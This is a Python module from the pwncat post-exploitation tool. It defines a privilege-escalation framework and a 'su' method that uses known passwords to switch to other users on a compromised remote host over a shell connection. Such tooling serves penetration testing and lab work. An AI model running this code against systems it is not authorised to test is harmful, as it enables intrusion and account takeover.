#!/usr/bin/env python3
from typing import Generator, Callable, List, Any
from dataclasses import dataclass
from colorama import Fore
import threading
import socket
import os

from pwncat import util
from pwncat.file import RemoteBinaryPipe
from pwncat.gtfobins import Capability

from enum import Enum


class PrivescError(Exception):
    """ An error occurred while attempting a privesc technique """


@dataclass
class Technique:
    # The user that this technique will move to
    user: str
    # The method that will be used
    method: "Method"
    # The unique identifier for this method (can be anything, specific to the
    # method)
    ident: Any
    # The GTFObins capabilities required for this technique to work
    capabilities: Capability

    def __str__(self):
        cap_names = {
            "READ": "file read",
            "WRITE": "file write",
            "SHELL": "shell",
        }
        return (
            f"{Fore.MAGENTA}{cap_names.get(self.capabilities.name, 'unknown')}{Fore.RESET} "
            f"as {Fore.GREEN}{self.user}{Fore.RESET} via {self.method.get_name(self)}"
        )


class Method:

    # Binaries which are needed on the remote host for this privesc
    name = "unknown"
    BINARIES = []

    @classmethod
    def check(cls, pty: "pwncat.pty.PtyHandler") -> bool:
        """ Check if the given PTY connection can support this privesc """
        for binary in cls.BINARIES:
            if pty.which(binary) is None:
                raise PrivescError(f"required remote binary not found: {binary}")

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        self.pty = pty

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Enumerate all possible escalations to the given users """
        raise NotImplementedError("no enumerate method implemented")

    def execute(self, technique: Technique):
        """ Execute the given technique to move laterally to the given user. 
        Raise a PrivescError if there was a problem. """
        raise NotImplementedError("no execute method implemented")

    def read_file(self, filename: str, technique: Technique) -> RemoteBinaryPipe:
        """ Execute a read_file action with the given technique and return a 
        remote file pipe which will yield the file contents. """
        raise NotImplementedError("no read_file implementation")

    def write_file(self, filename: str, data: bytes, technique: Technique):
        """ Execute a write_file action with the given technique. """
        raise NotImplementedError("no write_file implementation")

    def get_name(self, tech: Technique):
        return str(self)

    def __str__(self):
        return f"{Fore.RED}{self.name}{Fore.RESET}"


class SuMethod(Method):

    name = "su"
    BINARIES = ["su"]

    def enumerate(self, capability=Capability.ALL) -> List[Technique]:

        result = []
        current_user = self.pty.whoami()

        for user, info in self.pty.users.items():
            if user == current_user:
                continue
            if info.get("password") is not None or current_user == "root":
                result.append(
                    Technique(
                        user=user,
                        method=self,
                        ident=info["password"],
                        capabilities=Capability.SHELL,
                    )
                )

        return result

    def execute(self, technique: Technique):

        current_user = self.pty.current_user

        password = technique.ident.encode("utf-8")

        if current_user["name"] != "root":
            # Send the su command, and check if it succeeds
            self.pty.run(
                f'su {technique.user} -c "echo good"', wait=False,
            )

            self.pty.recvuntil(": ")
            self.pty.client.send(password + b"\n")

            # Read the response (either "Authentication failed" or "good")
            result = self.pty.recvuntil("\n")
            # Probably, the password wasn't echoed. But check all variations.
            if password in result or result == b"\r\n" or result == b"\n":
                result = self.pty.recvuntil("\n")

            if b"failure" in result.lower() or b"good" not in result.lower():
                raise PrivescError(f"{technique.user}: invalid password")

        self.pty.process(f"su {technique.user}", delim=False)

        if current_user["name"] != "root":
            self.pty.recvuntil(": ")
            self.pty.client.sendall(technique.ident.encode("utf-8") + b"\n")
            self.pty.flush_output()

        return "exit"

    def get_name(self, tech: Technique):
        return f"{Fore.RED}known password{Fore.RESET}"
